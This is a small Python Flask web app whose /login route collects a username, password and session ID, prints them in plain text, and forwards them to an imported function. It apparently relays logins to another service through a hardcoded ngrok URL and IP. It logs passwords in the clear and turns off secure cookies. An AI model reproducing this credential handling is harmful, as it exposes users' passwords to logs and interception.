import traceback
from flask import Flask, render_template, request, redirect, url_for
from main_code import main_code  # Import your function
import requests,time

app = Flask(__name__)
WEB_APP_URL = 'https://7d6f-110-39-215-194.ngrok-free.app/'

IS_LOGIN_CONTINUE = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def submit():
    try:
        global IS_LOGIN_CONTINUE
        if  IS_LOGIN_CONTINUE:
            return {
                                    "is_logged_in":False,
                                    "is_code_required":False,
                                    'is_login_continue':True
                    } 
            
        IS_LOGIN_CONTINUE = True
        username = request.form['username']
        password = request.form['password']
        session_id = request.form['session_id']
        print(username,password,session_id) 
        response_obj = main_code(username, password,session_id)
        IS_LOGIN_CONTINUE = False
        return response_obj
    except Exception as e:
        IS_LOGIN_CONTINUE = False
        traceback.print_exc()
        


app.config['SESSION_COOKIE_DOMAIN'] = '80.190.81.241'

app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'


if __name__ == "__main__":
    app.run(host='80.190.81.241', port=5000, debug=False)       
# if __name__ == '__main__':
#     app.run(debug=True)